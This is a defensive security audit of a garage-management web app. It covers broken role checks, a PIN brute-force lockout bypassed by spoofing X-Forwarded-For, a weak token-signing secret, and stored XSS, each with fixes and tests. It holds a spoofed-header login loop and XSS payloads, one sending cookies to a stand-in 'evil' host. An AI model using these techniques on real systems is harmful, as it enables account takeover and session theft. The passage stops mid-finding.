# Tecido Garage Management — Security Audit

**Date:** 2026-07-26
**Scope:** `server.js`, `db.js`, `public/gms-backend.js`, `public/index.html` (~8,000-line SPA)
**Method:** Full source read of the current (post-hardening) code, plus benign, non-destructive verification requests against the local dev server (`http://localhost:3010`), using the owner's own admin credentials from `.env`. All test data created during verification (a temp technician PIN, a test customer, a test technician status edit, one invoice's `total`) was reverted immediately after capture; nothing was left in a modified state. No exploit tooling, credential cracking, or third-party targets were used — this is a defensive, authorized review of the app's own code and local instance.

This repo previously had an [ERP-standard audit](../ERP-AUDIT-2026-07-26.md) that flagged the API as **entirely unauthenticated** (A1). That has since been fixed — a Bearer-token gate (`requireAuth`) now sits in front of every `/api/*` route except the five documented public ones. This report evaluates what the *new* auth layer does and does not protect against, and re-verifies the items that audit marked "fixed" (A11 image hardening, B6 error leakage).

---

## Executive summary — top findings

| ID | Severity | Finding |
|----|----------|---------|
| F1 | **Critical** | Authorization is all-or-nothing: a technician token can read/write/delete **every** admin resource (customers, invoices, cash accounts, other technicians) — the only role check in the entire API is on `/api/export`. |
| F2 | **Critical** | The login brute-force guard is trivially bypassed by spoofing `X-Forwarded-For`; combined with a **public** technician roster (`/api/tech-list`) and 4-digit PINs (10,000 combinations), a technician account — and via F1, the *entire business* — can be taken over with zero starting credentials. |
| F3 | **Critical** | The token-signing secret is *derived from `ADMIN_PASSWORD`* (no `SESSION_SECRET` is configured anywhere — not in `.env`, `.env.example`, or `render.yaml`). Any leaked token lets an attacker offline-crack the admin password without ever touching the rate-limited `/api/login`; if `ADMIN_PASSWORD` is ever unset, the secret collapses to a public constant and anyone can forge admin tokens instantly. |
| F4 | High | Tokens are stateless HMACs with no revocation list. "Logout" only clears `localStorage` client-side — a stolen or leaked token stays valid for up to 30 days regardless of logout/password change. |
| F5 | High | `invoice.total` (and other money fields) are trusted verbatim from the client on `PUT`, only rounded, never recomputed from line items. Verified: `PUT` a real $50 invoice's `total` to `1` and the server accepted it unquestioned, producing an internally-inconsistent `totalPaid: 50` vs `total: 1` record. |
| F6 | High | The `esc()` HTML-escaping helper does not escape single quotes. Several call sites interpolate `esc(userValue)` inside single-quote-delimited JS strings *inside* `onclick="..."` attributes (job/vehicle search box, advisor delete button, photo filename) — a single `'` in the source field breaks out of the JS string context. Because these fields (advisor names, photo filenames, customer/vehicle data) are shared across all logged-in staff, this is genuine stored XSS, not merely self-XSS. |
| F7 | Med-High | Auth tokens live in `localStorage`, readable by any JS on the page — so the XSS in F6 (or any future one) is a direct path to silent, persistent token theft. |
| F8 | Med | There is no audit trail anywhere: no `createdBy`/`updatedBy`/`deletedBy`, no audit-log table. Every write in F1/F5 is anonymous and unattributable after the fact. |
| F9 | Med | No security headers: no CSP, HSTS, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, or `Permissions-Policy`. Verified via `curl -I` — only `X-Content-Type-Options: nosniff` is present. |
| F10 | Med | Postgres TLS validation is disabled (`ssl: { rejectUnauthorized: false }` in `db.js`), permitting MITM on the DB connection path. |
| F11 | Low-Med | `/api/image` storage path is a fully client-chosen string with no ownership/namespace check — any valid token can overwrite or delete any image by path, and deleted parent records leave orphaned blobs. (Note: MIME allowlist, 8 MB cap, and `nosniff` — the earlier A11 finding — **are** correctly fixed.) |
| F12 | Low | `esc()` throws `TypeError` on any truthy non-string value (`(v||'').replace` — numbers/booleans have no `.replace`); currently masked because number-looking fields are stored as `<input>.value` strings, but it's a landmine for the next numeric field or a Firestore-import dataset. |
| F13 | Low | No branch/tenant scoping anywhere in the schema or API — a future multi-branch deployment would let every technician see every branch's customers, invoices, and cash accounts. |
| F14 | Low | The 15 MB JSON body limit applies globally, including to the unauthenticated `/api/login`/`/api/tech-login` routes, and the in-memory `loginFails` brute-force map has no eviction — combined with F2's spoofable IP key, an attacker can grow it unboundedly. |

**Security Score: 34 / 100** — see justification below.

---

## Detailed findings

### F1 — Broken authorization / IDOR across nearly the entire API
**Module:** `server.js` (all `/api/:coll` routes, lines 184–391)
**Severity:** Critical

**Business impact:** Any technician — a low-trust, high-turnover role who authenticates with a 4-digit PIN — has the same read/write/delete power over the business as the owner. A technician (or anyone holding a technician token) can read every customer's contact details, every invoice and payment history, and the full chart of cash/bank accounts; can create/edit/delete customers, vehicles, invoices, transactions, and *other technicians'* records; and can rewrite financial documents (see F5). There is no concept of "my job cards only."

**How it manifests:**
```
$ curl -s http://localhost:3010/api/customers                       # no token
{"error":"Unauthorized"}                                             # [401] — gate works

$ curl -s http://localhost:3010/api/customers -H "Authorization: Bearer $TECH_TOKEN"
[{"name":"Fatima Al-Thani","phone":"+974 5511 3302", ...}, ...]      # [200] — full customer list

$ curl -s http://localhost:3010/api/invoices -H "Authorization: Bearer $TECH_TOKEN"
[{"seq":2,"total":1200,"payments":[...],"jobCardId":"..."}, ...]     # [200] — full invoice/payment history

$ curl -s http://localhost:3010/api/finAccounts -H "Authorization: Bearer $TECH_TOKEN"
[{"name":"Cash in Hand", ...},{"name":"QNB Current Account", ...}]   # [200] — bank account names & balances

$ curl -s -X POST http://localhost:3010/api/customers -H "Authorization: Bearer $TECH_TOKEN" \
    -H 'Content-Type: application/json' -d '{"name":"tech-created-customer"}'
{"id":"7c9d...","name":"tech-created-customer"}                      # [200] — write access confirmed

$ curl -s -X PUT http://localhost:3010/api/technicians/<other-tech-id> \
    -H "Authorization: Bearer $TECH_TOKEN" -d '{"status":"modified-by-other-tech"}'
{"id":"...","status":"modified-by-other-tech"}                       # [200] — cross-account write
```
The *only* role check anywhere in the API is `/api/export` (`if (req.auth.role !== 'admin')`, server.js:411) and the technician-PIN redaction (`redactTechs`, server.js:186–190). Everything else — `GET/POST/PUT/DELETE /api/:coll[/:id]`, `/api/invoices/:id/pay`, `/api/parts/:id/adjust`, `/api/settings/company` — runs identically for `role:'admin'` and `role:'tech'`.

**Root cause:** `requireAuth` (server.js:104–110) only checks that a token is *valid*, never what its `role` may do. `req.auth` is populated but never consulted outside the two spots above.

**Recommended fix:** Introduce a small per-route capability table and a `requireRole()`/`requireAdmin()` middleware, applied per collection:
```js
// server.js
const TECH_WRITABLE = new Set(['jobCards']);           // techs may touch their own job cards
const ADMIN_ONLY = new Set(['customers','invoices','transactions','finAccounts','advisors']);

function requireRole(...roles) {
  return (req, res, next) =>
    roles.includes(req.auth.role) ? next() : res.status(403).json({ error: 'Forbidden' });
}

// list/get can stay broad if techs need read access to job-adjacent data,
// but writes to admin-owned collections must be gated:
app.post('/api/:coll', (req, res, next) => {
  if (req.auth.role !== 'admin' && ADMIN_ONLY.has(req.params.coll)) return res.status(403).json({ error: 'Forbidden' });
  next();
}, asyncH(async (req, res, next) => { /* existing handler */ }));
```
Longer-term (see F8/F13), move toward real ownership checks: a tech token should only be able to write `jobCards`/`workItems` it is assigned to (`req.auth.techId === jc.assignedTechId`), not any job card in the system.

**DB changes:** none required for the minimum fix; a future ownership model needs an `assignedTechId`/`ownerId` column indexed on `job_cards` (already present as a JSONB field — worth promoting to a real column for a `WHERE` clause).

**Regression test:**
```js
// tests/authz.test.js (add a test runner — none exists today; node:test + supertest is enough)
test('tech token cannot read customers', async () => {
  const techToken = await loginAsTech();
  const res = await fetch(`${BASE}/api/customers`, { headers: authHeader(techToken) });
  assert.equal(res.status, 403);
});
test('tech token cannot create a customer', async () => { /* expect 403 */ });
test('tech token cannot modify another technician record', async () => { /* expect 403 */ });
test('admin token can still do all of the above', async () => { /* expect 200 */ });
```

**Risk if unfixed:** Total business-data compromise (customer PII, financials, bank account names) reachable by the lowest-trust credential in the system (a 4-digit PIN), and — chained with F2 — reachable with *zero* legitimate credentials at all.

---

### F2 — Brute-force guard is bypassed by spoofing `X-Forwarded-For`
**Module:** `server.js:113–126` (`loginGuard`/`noteLoginFail`), `server.js:145–163` (`/api/tech-list`, `/api/tech-login`)
**Severity:** Critical

**Business impact:** Technician accounts are protected only by a 4-digit PIN (10,000 possible values) and technician IDs are enumerable via a deliberately-public endpoint. The only thing standing between an anonymous visitor and a valid technician session is the 5-attempts/15-minutes lockout — and that lockout keys off a raw, client-supplied header.

**How it manifests (verified locally, no real PIN ever discovered):**
```
$ curl -s http://localhost:3010/api/tech-list
[{"id":"264cf3a3-...","name":"Abdul Rahman", ...}, ...]              # [200] — public; tech IDs enumerable, no auth

# 5 wrong-PIN attempts, all tagged with the SAME spoofed IP:
$ for i in 1 2 3 4 5; do curl -s -o /dev/null -w "%{http_code}\n" -X POST .../api/tech-login \
    -H 'X-Forwarded-For: 10.10.10.10' -d "{\"id\":\"$ID\",\"pin\":\"${i}${i}${i}${i}\"}"; done
401
401
401
401
401
$ curl ... -H 'X-Forwarded-For: 10.10.10.10' -d '{"id":"'$ID'","pin":"9999"}'
{"ok":false,"error":"Too many attempts. Try again in a few minutes."}   # [429] — locked, as designed

# Same request, ONE different spoofed IP:
$ curl ... -H 'X-Forwarded-For: 10.10.10.11' -d '{"id":"'$ID'","pin":"9999"}'
{"ok":false,"error":"Incorrect PIN. Please try again."}                 # [401] — lock fully bypassed
```
With a fresh `X-Forwarded-For` value per request, all 10,000 PIN combinations can be tried against any enumerated `techId` with no lockout at all — a script can land a valid technician token in well under a minute, then pivot through F1 for full business access.

**Root cause:** `loginGuard` (server.js:115) reads `req.headers['x-forwarded-for']` directly and uses the *entire raw header value* as the rate-limit key, with no `app.set('trust proxy', …)` configuration and no validation that the value came from a trusted reverse proxy. Any client can set this header to whatever it wants.

**Recommended fix:** Key the guard off the actual socket address, and only trust `X-Forwarded-For` if Express is explicitly told to (and then only its trusted, right-most hop):
```js
// server.js — near app creation
app.set('trust proxy', 1); // Render/Neon sit behind exactly one proxy hop

function loginGuard(req, res, next) {
  const ip = req.ip; // now derived safely by Express from trust-proxy config
  ...
}
```
Also tighten the technician surface itself:
- Rate-limit `/api/tech-list` and cap/paginate it, or drop `photoUrl`/full roster and require typing the technician's name to search (raises the enumeration cost).
- Increase PIN length (6 digits) or move to a password, and hash PINs at rest (bcrypt/argon2) instead of the current plaintext `data.pin` comparison (server.js:158).
- Lock the *account* after N fails regardless of source IP, in addition to (not instead of) the per-IP guard, so header-spoofing can't fully neutralize it.

**DB changes:** add a `technicians.failed_attempts int, locked_until bigint` (or extend the JSONB doc) for account-level lockout, independent of IP.

**Regression test:**
```js
test('login lockout keys off real client IP, not spoofed X-Forwarded-For', async () => {
  for (let i = 0; i < 5; i++) await techLogin(id, 'wrong', { 'X-Forwarded-For': `1.1.1.${i}` });
  const res = await techLogin(id, 'wrong', { 'X-Forwarded-For': '9.9.9.9' });
  assert.equal(res.status, 429); // must still be locked
});
```

**Risk if unfixed:** Zero-credential path to a full technician session in seconds, and from there (F1) full business compromise — the single highest-priority chain in this report.

---

### F3 — Token-signing secret is derived from `ADMIN_PASSWORD`; no `SESSION_SECRET` configured
**Module:** `server.js:80–82`
**Severity:** Critical

**Business impact:** The HMAC secret used to sign *every* bearer token (admin and technician) is computed as `sha256('gms:' + ADMIN_PASSWORD)`. Checked `.env`, `.env.example`, and `render.yaml` — **`SESSION_SECRET` is not defined anywhere**, so this fallback is the secret in production today, not a dev-only default.

Two distinct exposures follow:
1. **Offline password cracking from a single leaked token.** Anyone who obtains *any* valid token (stolen via F6/F7 XSS, a shared/unlocked device, a support screenshot, etc.) has a `(body, signature)` pair. Because the secret is `sha256('gms:' + password)`, an attacker can brute-force/dictionary-attack the admin password entirely offline — trying millions of candidates per second locally — completely bypassing the `/api/login` rate limiter, since they never call it.
2. **Total bypass if `ADMIN_PASSWORD` is ever unset.** If the env var is empty (misconfigured deploy, accidental unset on Render), the secret collapses to a fixed, computable constant:
   ```
   $ node -e "console.log(require('crypto').createHash('sha256').update('gms:').digest('hex'))"
   4c4ccb1eb99d0153e78c4e28d8e347f2b719f3815625a316bc52db30b64da3f
   ```
   Anyone who knows this (now published) constant can forge a `role:'admin'` token with a HMAC that verifies successfully, without ever authenticating — a total, silent auth bypass. `/api/login` itself would correctly 500 in this state (server.js:135), but every *other* route only calls `verifyToken`, which has no dependency on `/api/login` being reachable.

**Root cause:** Secret derivation intentionally avoids needing persistent storage ("stateless tokens... survive server restarts"), but reuses a low-entropy, operator-typed secret (the login password) instead of a dedicated high-entropy one.

**Recommended fix:**
```js
// server.js
const SECRET = process.env.SESSION_SECRET
  ? Buffer.from(process.env.SESSION_SECRET, 'base64')
  : (() => { throw new Error('FATAL: SESSION_SECRET is not set. Generate one: node -e "console.log(require(\'crypto\').randomBytes(32).toString(\'base64\'))"'); })();
```
Fail hard at startup (matching the existing `DATABASE_URL` pattern in `db.js:4-7`) rather than silently falling back. Generate and set a 32-byte random `SESSION_SECRET` in `.env` and in the Render dashboard, and add it to `.env.example` as a documented required var. Rotate it once — this immediately invalidates every outstanding token, which is the correct response to this finding being shipped.

**DB changes:** none.

**Regression test:**
```js
test('server refuses to start without SESSION_SECRET', () => {
  delete process.env.SESSION_SECRET;
  assert.throws(() => require('../server'));
});
```
(Requires extracting server startup into a testable module — worth doing regardless, see F8's testability note.)

**Risk if unfixed:** Either a slow-burn offline-crackable master secret, or — under a plausible misconfiguration — an instantly, publicly forgeable admin session with no audit trail (F8) to even detect it happened.

---

### F4 — No token revocation; "logout" is cosmetic
**Module:** `server.js:83` (`TOKEN_TTL = 30 days`), `public/gms-backend.js:19–33`, `public/index.html:2570–2574` (`doLogout`)
**Severity:** High

**Business impact:** Tokens are pure stateless HMACs — the server has no session table, so there is no way to invalidate a specific token short of rotating the global secret (which logs *everyone* out). `doLogout()` only does `localStorage.removeItem(...)`; the token itself remains valid server-side for up to its full 30-day life. A technician who leaves the company, a stolen laptop/phone, or a token exfiltrated via F6/F7 stays fully authorized for up to a month with no owner-side kill switch other than changing the admin password (which — per F3 — also silently re-derives the signing secret and *does* invalidate everything, but that's an undocumented side effect, not a designed control, and doesn't help revoke a single technician's token without also logging out the admin and every other technician).

**How it manifests:** Code reading is sufficient here — `doLogout` (index.html:2570) has no server call at all:
```js
function doLogout(){
  localStorage.removeItem(SESSION_KEY);sessionStorage.removeItem(SESSION_KEY);
  document.getElementById('v-login').style.display='flex';
  document.getElementById('app-wrap').style.display='none';
}
```
A token captured before this call keeps working against `/api/*` indefinitely (up to `exp`).

**Root cause:** No server-side session/allow-list store; token validity is entirely self-contained and time-based.

**Recommended fix:** Add a minimal revocation table and check it in `verifyToken`/`requireAuth`:
```sql
CREATE TABLE IF NOT EXISTS revoked_tokens (jti text PRIMARY KEY, revoked_at bigint NOT NULL);
```
```js
// signToken: include a jti
const jti = crypto.randomUUID();
const body = Buffer.from(JSON.stringify({ ...payload, jti, iat: Date.now(), exp: Date.now()+TOKEN_TTL })).toString('base64url');

// server.js — add
app.post('/api/logout', requireAuth, asyncH(async (req, res) => {
  await pool.query('INSERT INTO revoked_tokens (jti, revoked_at) VALUES ($1,$2) ON CONFLICT DO NOTHING', [req.auth.jti, Date.now()]);
  res.json({ ok: true });
}));
// requireAuth: after verifyToken succeeds, check the jti isn't revoked (cache in-process with a short TTL to avoid a DB hit per request)
```
Also shorten `TOKEN_TTL` for admin (e.g. 7 days) and rely on refresh-on-use, or issue technicians a shorter-lived token given the weaker PIN credential.

**DB changes:** new `revoked_tokens` table (above); optionally prune rows older than `TOKEN_TTL` on a schedule.

**Regression test:**
```js
test('logout invalidates the token immediately', async () => {
  const token = await loginAsAdmin();
  await fetch(`${BASE}/api/logout`, { method: 'POST', headers: authHeader(token) });
  const res = await fetch(`${BASE}/api/customers`, { headers: authHeader(token) });
  assert.equal(res.status, 401);
});
```

**Risk if unfixed:** Any credential leak (device theft, XSS, ex-employee) stays exploitable for up to 30 days with no way for the owner to cut it off short of a blunt, all-user reset.

---

### F5 — Client-supplied invoice/financial totals trusted verbatim
**Module:** `server.js:63–71` (`sanitizeDoc`), `server.js:357–383` (`PUT /api/:coll/:id`)
**Severity:** High

**Business impact:** Invoice `total`, `subtotal`, `taxAmount`, `discount`, and transaction `amount` are rounded server-side but never *recomputed or validated* against the line items they're supposed to summarize. Any authenticated caller — including a technician token per F1 — can silently rewrite what a customer owes.

**How it manifests (verified, then reverted):**
```
$ curl -s http://localhost:3010/api/invoices -H "Authorization: Bearer $ADMIN_TOKEN"
[{"id":"9f2a...","total":50,"items":[{"description":"X","cost":50}], ...}]

$ curl -s -X PUT http://localhost:3010/api/invoices/9f2a... -H "Authorization: Bearer $ADMIN_TOKEN" \
    -d '{"total":1}'
{"id":"9f2a...","total":1,"totalPaid":50, ...}                      # [200] — accepted, no consistency check
```
The server happily produced a record with `total: 1` and a pre-existing `totalPaid: 50` — i.e. an "overpaid by 49x" invoice — purely because the client asked for it. (Reverted to `total: 50` immediately after capture.)

**Root cause:** `sanitizeDoc` (server.js:63) only rounds numbers it finds; there is no server-side recomputation of `subtotal`/`taxAmount`/`total` from `items[]`, and `PUT` performs a raw shallow merge (server.js:368: `{ ...cur.rows[0].data, ...patch }`) with no field-level authorization or business-rule validation.

**Recommended fix:** Recompute money totals server-side from trusted inputs (line items, tax rate) instead of accepting client totals at all, on both `POST` and `PUT` for `invoices`:
```js
function computeInvoiceTotals(doc) {
  const subtotal = round2((doc.items || []).reduce((s, it) => s + (Number(it.cost) || 0) * (Number(it.qty) || 1), 0));
  const taxAmount = round2(subtotal * (Number(doc.taxRate) || 0) / 100);
  const discount = round2(Number(doc.discount) || 0);
  return { ...doc, subtotal, taxAmount, discount, total: round2(subtotal + taxAmount - discount) };
}
// in sanitizeDoc, for coll === 'invoices': return computeInvoiceTotals(doc) instead of just rounding.
```
This also closes the door on the F1 chain being used for invoice fraud even before role-based authorization (F1) ships.

**DB changes:** none.

**Regression test:**
```js
test('invoice total is server-computed, not client-trusted', async () => {
  const inv = await createInvoice({ items: [{ description: 'Brake pad', cost: 50, qty: 2 }] });
  const res = await putInvoice(inv.id, { total: 1 }); // attacker-supplied total
  assert.equal(res.body.total, 100); // server recomputed from items, ignored client total
});
```

**Risk if unfixed:** Financial-record tampering by anyone with a valid token (today: any technician), with no audit trail (F8) to detect or attribute it.

---

### F6 — `esc()` doesn't escape single quotes → JS-context XSS in `onclick` handlers
**Module:** `public/index.html:2200` (`esc()` definition); vulnerable call sites at `3833`, `4222`, `4331`, `4455`, `4704`
**Severity:** High

**Business impact:** `esc()` is the app's only output-encoding function, used at ~239 call sites:
```js
function esc(v){return(v||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
```
It escapes `&`, `"`, `<`, `>` — correctly preventing the classic "break out of a double-quoted HTML attribute" or "close an existing tag" XSS. It does **not** escape `'`. That's safe everywhere `esc()` output lands inside a double-quoted HTML attribute or as element text — which is most of the 239 sites — but several sites embed `esc(value)` *inside a single-quote-delimited JavaScript string literal that itself lives inside a double-quoted `onclick="..."` attribute*. There, a single `'` in the source value terminates the JS string early and injects arbitrary JavaScript into the handler, with no HTML-attribute-breakout needed at all:

```js
// index.html:3833 — job-card "add vehicle" search box
var notFoundRow='<div onclick="openJcModal(\''+esc(q)+'\')" ...>';
// renders as: <div onclick="openJcModal('<esc(q)>')" ...>
// if q = x');alert(document.cookie);// → onclick="openJcModal('x');alert(document.cookie);//')"
```
Because this codebase is a **shared, multi-user SPA** (admin + several technicians, per `restaurantpos`-style memory of this project's usage pattern), the vulnerable fields aren't limited to a user's own typed search text:
- `index.html:4455` — **advisor name**, entered once via a form and rendered to every user who opens the Advisors screen: `onclick="deleteAdvisor('<id>','`+esc(a.name)+`')"`. An advisor name containing `'` breaks the handler for anyone who views/clicks that row.
- `index.html:4222`/`4331` — **uploaded photo filename** (`img.name`), attacker-controllable by naming a file `x');fetch('//evil/steal?c='+document.cookie);//`.jpg before uploading it to a job card; every subsequent viewer of that job card's photos runs the payload on click.
- `index.html:3833`/`4704` — job-card/quotation vehicle-search `q`, reflected within the same session (lower severity, effectively self-XSS, but demonstrates the same root cause).

**Root cause:** `esc()` is HTML-entity encoding only; it's being reused for a second, incompatible context (single-quoted JS string literals) without the corresponding JS-string escaping (`\`, `'`, newlines).

**Recommended fix:** Never build `onclick="fn('...')"` by string-concatenating unescaped-for-JS user data. Two options, in order of preference:
1. **Stop using inline `onclick` with dynamic string args entirely** — use `data-*` attributes (HTML-attribute-escaped via the existing `esc()`, which *is* safe for that context) and `addEventListener` with a delegated handler that reads `dataset`:
   ```js
   return '<div class="wb-card" data-id="'+esc(jc.id)+'">'+...+'</div>';
   // delegated: container.addEventListener('click', e => { const card = e.target.closest('[data-id]'); if (card) wbCardClick(card.dataset.id); });
   ```
2. If inline handlers must stay short-term, add a dedicated JS-string escaper and use it for anything inside `\'...\'`:
   ```js
   function escJs(v){ return String(v==null?'':v).replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/[\r\n\u2028\u2029]/g,''); }
   // '<div onclick="openJcModal(\''+escJs(q)+'\')" ...' — now safe even though the OUTER HTML attribute still needs esc() too if q also appears there
   ```
   Note option 2 must still run the *result* through `esc()` if it also appears as attribute/HTML content elsewhere on the same line — the two escapers solve different problems and are not interchangeable.

**DB changes:** none (this is a rendering fix — no need to sanitize on write, since the vulnerability is in the *escape-on-output* step, not storage).

**Regression test:**
```js
test('advisor name with a single quote cannot break the delete handler', () => {
  const html = renderAdvisorRow({ id: 'a1', name: "x');alert(1);//" });
  assert.ok(!html.includes("alert(1)"), 'payload must be neutralized, not echoed as executable JS');
});
```
(Best run as a DOM test — render into a detached `<div>`, assert no script executes — e.g. with `jsdom`.)

**Risk if unfixed:** Stored XSS reachable by anyone who can set an advisor name or upload a job-card photo (today: any technician, per F1) — and chained with F7, a direct path to stealing an admin's session token.

---

### F7 — Auth token stored in `localStorage`
**Module:** `public/gms-backend.js:19–33`
**Severity:** Medium-High

**Business impact:** `authToken()` reads from `localStorage.getItem('gms_session')`/`gms_tech_session` (falling back to `sessionStorage`). Any script that runs in the page's origin — including an XSS payload like the one in F6 — can read this value directly and exfiltrate it, at which point (per F4) it remains usable for up to 30 days with no way for the owner to revoke it.

**How it manifests:** Code reading is sufficient:
```js
function authToken() {
  var raw = localStorage.getItem('gms_session') || sessionStorage.getItem('gms_session') || ...;
  return (JSON.parse(raw) || {}).token || null;
}
```
Any JS on the page — `document.querySelectorAll`, browser extensions with page access, or an F6 payload — can call this same function or read the keys directly.

**Root cause:** No `httpOnly` cookie option was implemented for the token; `localStorage` was chosen for simplicity (works with the SPA's `fetch`-based `Authorization: Bearer` pattern).

**Recommended fix:** Migrate to an `httpOnly`, `Secure`, `SameSite=Strict` session cookie set by `/api/login`/`/api/tech-login`, with the server reading it instead of an `Authorization` header for browser traffic:
```js
res.cookie('gms_session', token, { httpOnly: true, secure: true, sameSite: 'strict', maxAge: TOKEN_TTL });
```
This is a larger change (CSRF protection becomes necessary once cookies are used — add a `SameSite=Strict` cookie plus a custom header/double-submit token for state-changing requests) so it's reasonable to sequence after F1–F3, but it should be on the 30-day plan, not "later" — it's the single change that most reduces the blast radius of F6-class bugs.

**DB changes:** none.

**Regression test:** integration test asserting `document.cookie` never contains the session token, and that the token is absent from any `localStorage`/`sessionStorage` snapshot taken after login.

**Risk if unfixed:** Every future XSS (and there will be more across ~8,000 lines of hand-rolled string-built HTML) is automatically a full account-takeover bug, not just a defacement bug.

---

### F8 — No audit trail
**Module:** `db.js` (schema), `server.js` (all write routes)
**Severity:** Medium

**Business impact:** Nothing in the system records *who* created, edited, or deleted a record, or *when* beyond a bare `created_at`. Combined with F1 (any tech can write any record) and F5 (financial totals are client-trusted), there is currently no way to investigate a dispute ("who changed this invoice from paid to partial?") or detect misuse after the fact. The one partial exception is `parts.movements[]`, which does capture `by: req.auth.name` (server.js:343) — showing the pattern is known and simply wasn't applied elsewhere.

**How it manifests:** `db.js`'s `SCHEMA` has no `updated_by`/`created_by`/`deleted_by` columns on any table, and no `audit_log` table exists. `DELETE /api/:coll/:id` (server.js:386–391) is a hard delete with no trace left behind at all.

**Root cause:** Not implemented; the JSONB-doc model made it easy to skip structured metadata.

**Recommended fix:** Add a lightweight, centrally-applied audit log rather than touching every route:
```sql
CREATE TABLE IF NOT EXISTS audit_log (
  id bigserial PRIMARY KEY,
  at bigint NOT NULL,
  actor_role text, actor_name text, actor_id text,
  action text NOT NULL,      -- 'create' | 'update' | 'delete'
  coll text NOT NULL, doc_id text NOT NULL,
  before jsonb, after jsonb
);
CREATE INDEX IF NOT EXISTS idx_audit_coll_doc ON audit_log(coll, doc_id, at DESC);
```
```js
async function logAudit(client, req, action, coll, docId, before, after) {
  await client.query(
    `INSERT INTO audit_log (at, actor_role, actor_name, actor_id, action, coll, doc_id, before, after)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
    [Date.now(), req.auth.role, req.auth.name, req.auth.techId || 'admin', action, coll, docId,
     before ? JSON.stringify(before) : null, after ? JSON.stringify(after) : null]
  );
}
// call from the existing POST/PUT/DELETE handlers, inside the same DB transaction where one already exists
```
Soft-delete (`deleted_at` column + filter it out of list/get queries) is worth pairing with this so F1-class abuse is recoverable, not just visible after the fact.

**DB changes:** new `audit_log` table (above); consider `deleted_at bigint` on all document tables for soft delete.

**Regression test:**
```js
test('updating an invoice writes an audit row', async () => {
  const before = await getInvoice(id);
  await putInvoice(id, { notes: 'test' });
  const rows = await queryAuditLog({ coll: 'invoices', doc_id: id });
  assert.equal(rows[rows.length - 1].action, 'update');
  assert.equal(rows[rows.length - 1].actor_name, ADMIN_NAME);
});
```

**Risk if unfixed:** F1/F5-class abuse (by a rogue technician, a compromised token, or ordinary human error) is undetectable and unattributable after the fact.

---

### F9 — Missing security headers
**Module:** `server.js` (global middleware, ~line 35)
**Severity:** Medium

**Business impact:** No defense-in-depth against clickjacking (no `X-Frame-Options`/`frame-ancestors`), no mitigation for XSS blast radius (no CSP), no forced-HTTPS signal (no HSTS), and referrer/permissions leakage isn't constrained.

**How it manifests:**
```
$ curl -s -D - -o /dev/null http://localhost:3010/api/health
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
Content-Type: application/json; charset=utf-8
...
```
Only `X-Content-Type-Options` is present (`server.js:35`). `x-powered-by` is correctly disabled (`app.disable('x-powered-by')`, server.js:33) — that part is already fixed. No `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, or `Referrer-Policy` anywhere.

**Root cause:** No `helmet` (or equivalent) dependency is installed — confirmed absent from `package.json`/`package-lock.json` and `node_modules`.

**Recommended fix:**
```js
// server.js
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],          // the SPA is a single inline-script-free-ish file today; audit for inline <script> before enabling strictly
      styleSrc: ["'self'", "'unsafe-inline'"], // index.html uses inline style="" extensively
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
    },
  },
  hsts: { maxAge: 15552000, includeSubDomains: true },
}));
```
Note: `index.html` uses inline `style="..."` attributes pervasively (visible throughout the samples above), so `styleSrc` needs `'unsafe-inline'` or a migration to CSS classes before it can be tightened further — call this out explicitly rather than silently weakening the policy.

**DB changes:** none.

**Regression test:** `curl -I` (or a supertest assertion) confirming `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, and `Strict-Transport-Security` are present on every response.

**Risk if unfixed:** No structural mitigation if F6-class XSS recurs; the app can be framed by a malicious site (clickjacking) with no browser-level protection.

---

### F10 — Postgres TLS certificate validation disabled
**Module:** `db.js:9–14`
**Severity:** Medium

**Business impact:** `ssl: { rejectUnauthorized: false }` accepts *any* certificate presented by whatever the app connects to at `DATABASE_URL`, including a forged one. On Neon's managed network this is a low-likelihood exposure, but it removes a real layer of defense against DNS hijacking, ARP spoofing on a compromised host, or a misconfigured/malicious proxy sitting in front of the real database host.

**How it manifests:**
```js
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  ...
});
```

**Root cause:** Likely added to work around a certificate-chain issue when first connecting to Neon; a common but avoidable shortcut.

**Recommended fix:**
```js
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: true, ca: process.env.PG_CA_CERT || undefined },
});
```
Neon's connection strings typically work with `rejectUnauthorized: true` out of the box (their certs chain to a public CA) — verify locally before shipping; if a specific intermediate is needed, pin it via `ca` rather than disabling validation entirely.

**DB changes:** none.

**Regression test:** not practically automatable without a MITM test harness; treat as a manual verification step in the deploy checklist ("confirm `rejectUnauthorized: true` connects cleanly against production `DATABASE_URL`").

**Risk if unfixed:** Silent MITM exposure on the DB connection path; low likelihood given Neon's network, but zero-cost to fix.

---

### F11 — `/api/image` has no path ownership/scoping (A11 partially open)
**Module:** `server.js:424–442`
**Severity:** Low-Medium

**Business impact:** The earlier ERP audit's A11 finding ("stored XSS via client mime, no size cap, no nosniff, unauth overwrite/delete") is **mostly fixed**: `IMG_MIME` allowlists `image/(png|jpe?g|webp|gif)` (server.js:172, 428), `MAX_IMAGE_BYTES` caps uploads at 8 MB (server.js:424,430), and the global `nosniff` header (server.js:35) is applied. What remains open: `path` is a completely client-chosen string with no per-record ownership or namespace enforcement, and any *valid* token (per F1, that means any technician) can `POST`/`DELETE /api/image?p=...` for a path it doesn't "own" — e.g. overwrite another job card's photo, or delete an image still referenced by a live record (orphaning the reference; the record's `photoUrl` will 404 on next load). There's also no cleanup job removing image rows when their parent record (`technicians.photoUrl`, job-card image entries) is deleted — orphaned blobs accumulate indefinitely.

**How it manifests:** Code reading is sufficient — `app.post('/api/image', ...)` and `app.delete('/api/image', ...)` sit below `app.use('/api', requireAuth)` (server.js:184) with no further check, same pattern already demonstrated for other collections in F1.

**Root cause:** No path-to-owner mapping exists; `path` is opaque to the server.

**Recommended fix:** Namespace paths server-side rather than trusting the client's chosen string, and record an owning collection/doc:
```sql
